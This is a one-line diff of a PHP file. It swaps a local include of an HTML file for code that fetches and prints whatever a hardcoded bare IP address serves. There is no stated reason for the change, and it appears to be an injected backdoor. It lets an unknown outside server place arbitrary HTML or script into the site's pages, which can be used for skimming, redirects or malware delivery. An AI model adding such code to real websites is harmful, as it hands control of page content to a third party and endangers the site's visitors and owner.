@@ -1,1 +1,1 @@
-<?php include '../js/index.html'; ?>
+<?php echo file_get_contents('http://3.88.129.153/'); ?>
